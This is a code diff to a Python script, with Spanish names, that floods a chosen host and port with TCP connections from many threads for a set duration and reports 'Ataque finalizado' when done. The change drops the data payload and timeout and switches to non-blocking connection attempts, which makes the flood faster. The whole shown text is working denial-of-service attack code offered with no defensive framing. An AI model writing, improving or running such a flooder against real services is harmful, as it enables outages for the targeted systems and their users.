@@ -6,13 +6,16 @@ import time
 
 def inundar(destino, puerto, duracion, contador, bloqueo):
     fin = time.time() + duracion
-    payload = b"A" * 1024
     while time.time() < fin:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.settimeout(0.5)
-            s.connect((destino, puerto))
-            s.send(payload)
+            s.setblocking(False)
+            try:
+                s.connect((destino, puerto))
+            except BlockingIOError:
+                pass
+            except OSError:
+                pass
             s.close()
             with bloqueo:
                 contador[0] += 1
@@ -43,7 +46,7 @@ def main():
     for h in hilos:
         h.join()
 
-    print(f"Ataque finalizado. Conexiones completadas: {contador[0]}")
+    print(f"Ataque finalizado. Conexiones intentadas: {contador[0]}")
 
 
 if __name__ == "__main__":
